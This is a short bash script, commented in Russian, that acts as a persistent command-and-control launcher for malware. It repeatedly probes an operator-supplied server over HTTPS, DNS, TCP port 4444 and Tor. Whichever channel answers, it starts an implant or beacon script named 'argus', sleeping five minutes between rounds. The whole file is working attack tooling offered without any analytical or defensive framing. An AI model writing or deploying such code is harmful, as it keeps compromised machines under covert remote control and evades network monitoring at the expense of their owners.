#!/bin/bash
SERVER="${1:-your-server.com}"
while true; do
    # Канал 1: HTTPS (основной)
    curl -sk "https://$SERVER/api/ping" 2>/dev/null && { ~/argus_beacon_modern.sh "$SERVER"; continue; }
    # Канал 2: DNS (запасной)
    dig +short "ping.$SERVER" 2>/dev/null | grep -q . && { ~/argus_dns_beacon.sh "$SERVER"; continue; }
    # Канал 3: TCP (прямой)
    echo ping | nc -w 3 $SERVER 4444 2>/dev/null && { ~/argus_implant_v2.py "https://$SERVER"; continue; }
    # Канал 4: Tor (скрытый)
    curl -sk --socks5-hostname 127.0.0.1:9050 "https://$SERVER/api/ping" 2>/dev/null && { proxychains4 ~/argus_beacon_modern.sh "$SERVER"; continue; }
    sleep 300
done